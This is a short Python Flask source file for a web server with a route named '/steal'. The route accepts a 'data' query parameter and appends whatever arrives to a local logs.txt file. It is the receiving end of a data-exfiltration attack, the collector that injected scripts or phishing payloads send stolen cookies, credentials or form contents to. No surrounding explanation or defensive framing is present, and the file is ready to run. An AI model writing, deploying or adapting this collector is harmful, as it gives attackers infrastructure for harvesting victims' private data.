from flask import Flask, request

app = Flask(__name__)

@app.route('/steal', methods=['GET'])
def steal_data():
    data = request.args.get('data')
    if data:
        with open("logs.txt", "a") as f:
            f.write(data + "\n")
        return "Data Logged!", 200
    return "No data received", 400

if __name__ == "__main__":
    app.run(port=5000)
